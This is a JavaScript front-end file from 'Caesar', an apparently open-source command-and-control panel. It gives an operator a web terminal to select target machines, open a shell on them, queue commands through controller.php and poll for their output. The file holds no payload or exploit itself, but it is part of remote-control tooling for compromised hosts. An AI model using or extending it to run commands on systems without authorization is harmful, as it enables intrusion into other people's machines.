/*
	CAESAR

	Author : Michele '0blio' Cisternino
	Email  : miki.cisternino@gmail.com
	Github : https://github.com/0blio

	This project is released under the GPL 3 license.
*/

// Global variables
var check_connection_timeout;
var n_attempts_check_task_output = 0;
var csrf_token = $("#csrf_token").val();

// Local history
var crono = [];
var crono_pointer = 0;

function check_connection (command, target, timeout) {
	var u = 'controller.php?command=' + command + '&target=' + target + '&csrf_token=' + csrf_token;

	$.ajax({
		url : u,
		type : 'GET',
		success : function(data) {
			if (data == 'connected') {
				$("#output").append('[<span style="color:#3498db;">*</span>] Connected!<br>');
				$.get("controller.php?command=" + 'title&target=' + target + '&csrf_token=' + csrf_token, function(data, status) {
					$("#software").html(data);
					$('#input').prop("disabled", false);

					// Resizing input field
					$('#input').width($(document).width() - $('#software').width() - 30);

					$("#input").focus();
					$("html, body").animate({ scrollTop: $(document).height() }, "fast");
					$('#shell').text('true');
				});
			} else {
				$(document).keyup(function(e) {
					e.stopImmediatePropagation();
		 			if (e.keyCode == 27) {

						// Inserting 'exit' task to the target's queue in order to cancel the previous connection request
						$.get("controller.php?command=exit&target=" + target + "&shell=true" + '&csrf_token=' + csrf_token, function(data, status) {
							if (data == 'exit') {
								$('#software').html('<span style="color:#16a085">Target ' + target + '</span> <span style="color:#f1c40f">» </span>');
								$('#input').prop("disabled", false);
								$("#input").focus();
								$('#shell').text('false');
								clearTimeout(check_connection_timeout);
							}

						});
					}
				});

				check_connection_timeout = setTimeout(function(){ check_connection(command, target, timeout); }, timeout);
			}

		}
	});
}

function check_task_output (task_id, target, timeout) {
	var u = 'controller.php?command=check output ' + task_id + '&target=' + target + '&shell=true' + '&csrf_token=' + csrf_token;

	$.ajax({
		url : u,
		type : 'GET',
		success : function(data) {
			// If the target responded
			if (data != task_id) {
				if (data == 'executing')
					result = '[<span style="color:#f39c12;">!</span>] The command is being launched on a separate thread, check history for the output.<br>';
				else
					result = data;

				$("#output").append(preserve_formatting (result));
				n_attempts_check_task_output = 0;

				// Getting working directory and hostname from the db
				$.get("controller.php?command=" + 'title&target=' + target + '&csrf_token=' + csrf_token, function(data, status) {
					$("#software").html(data);

					$('#input').prop("disabled", false);

					// Resizing input field
					$('#input').width($(document).width() - $('#software').width() - 30);

					$("#input").focus();
					$("html, body").animate({ scrollTop: $(document).height() }, "fast");
				});

			} else if (n_attempts_check_task_output == 20) {
				// The target is probably disconnected
				result = '[<span style="color:#f39c12;">!</span>] Connection lost<br>';
				$("#output").append(result);
				$('#input').prop("disabled", false);

				// Resizing input field
				//$('#input').width($(document).width() - $('#software').width() - 50);
				$("#input").focus();

				n_attempts_check_task_output = 0;

				$('#shell').text('false');
				$('#software').html('<span style="color:#16a085">Target ' + id + '</span> <span style="color:#f1c40f">» </span>');

			} else if (data == 'exit') {
				$('#shell').text('false');

			} else if (data == task_id) {
				n_attempts_check_task_output += 1;
				$('#software').html('');
				$("input").attr('disabled','disabled');
				setTimeout(function(){ check_task_output(task_id, target, timeout); }, timeout);
			}

		}
	});
}

// If the user click anywhere on the screen the focus will remain on the input field
$("html").click(function() {
   $("#input").focus();
});



$(document).keydown (function(e) {

	// If user pressed "key up"
	if (e.which == 38) {
		if (crono_pointer > 0) {
			crono_pointer -= 1;
			$("#input").val(crono[crono_pointer]);
		}

	// Else user pressed "Key down"
	} else if (e.which == 40) {
		if (crono_pointer <= crono.length - 1) {
			crono_pointer += 1;
			$("#input").val(crono[crono_pointer]);
		}

		if (crono_pointer == crono.length)
			$("#input").val("");
	}
});


$("#input").keypress(function(event) {
	// If user pressed "enter"
	if (event.which == 13) {
		event.preventDefault();
		var command = $("#input").val();

		// Devo ogni volta svuotare il campo software e riscriverlo
		var software = $("#software").html();
		var result = software + escape_html(command) + "<br>";
		$("#output").append(result);

		command = command.trim();

		// Checking if it is possibile to execute the command client-side
		if (command != "") {

			// Adding command to the local history of issued commands
			crono.push (command);

			$("#software").html('');

			if (command == "clear") {
				$("#output").html("");
				$("#software").html(software);

			} else if (command == "newtab") {
				window.open(document.URL, '_blank');
				$("#software").html(software);

			// Else the command will be executed server-side
			} else {
				var target = $('#selected_target').text();
				var shell = $('#shell').text();

				// If a target is selected
				if (target != "") {

					// If there is a shell on the target
					if (shell == 'true') {
						$.get("controller.php?command=" + command + "&target=" + target + "&shell=true" + '&csrf_token=' + csrf_token, function(data, status) {
							if (data == 'exit') {
								id = $('#selected_target').text();
								$('#software').html('<span style="color:#16a085">Target ' + id + '</span> <span style="color:#f1c40f">» </span>');
								$('#shell').text('false');
							} else {
								$("input").attr('disabled','disabled');
								task_id = data;
								check_task_output (task_id, target, 500);
							}
						});

					} else {
						$.get("controller.php?command=" + command + "&target=" + target + '&csrf_token=' + csrf_token, function(data, status) {

							// If the user want to delesect his target
							if (data == 'back') {
								// Deselect target and reset scenario
								$('#selected_target').text('');
								$('#software').html('<span style="color:#EF2929">Caesar</span> <span style="color:#729FCF">» </span>');

							} else if (data == 'shell') {
								$("#output").append('[<span style="color:#3498db;">*</span>] Connecting to target (ESC to cancel)<br>');
								command = "check connection";

								$("input").attr('disabled','disabled');

								check_connection (command, target, 2000);

							// Else print the response of the server
							} else {
								result = data + "<br>";

								id = $('#selected_target').text();
								$('#software').html('<span style="color:#16a085">Target ' + id + '</span> <span style="color:#f1c40f">» </span>');

								$("#output").append(result);
							}
						});
					}

				// Else if no targets is selected
				} else {
					$.get("controller.php?command=" + encodeURIComponent(command) + '&csrf_token=' + csrf_token, function(data, status) {
						// If response from the server is 'exit' the session has been destroyed, so redirect to login
						if (data == "exit") {
							window.location.replace ("login.php");

						// Else if a target ID has been correctly selected update scenario
						} else if (data == 'selected') {
							id = command.replace('select target', '').trim();
							$('#selected_target').text(id);
							$('#software').html('<span style="color:#16a085">Target ' + id + '</span> <span style="color:#f1c40f">» </span>');

						// Else print response from the server
						} else {
							result = data + "<br>";
							$('#software').html('<span style="color:#EF2929">Caesar</span> <span style="color:#729FCF">» </span>');
							$("#output").append(result);

							if (command == "destroy") {
								window.setTimeout(function () {
						        location.href = document.location.origin;
						    }, 3000);
							}
						}
					});
				}
			}
		}

		// Resetting local history pointer
		crono_pointer = crono.length;

		// Reset input value
		$("#input").val("");
		$("html, body").animate({ scrollTop: $(document).height() }, "fast");
  	}
});
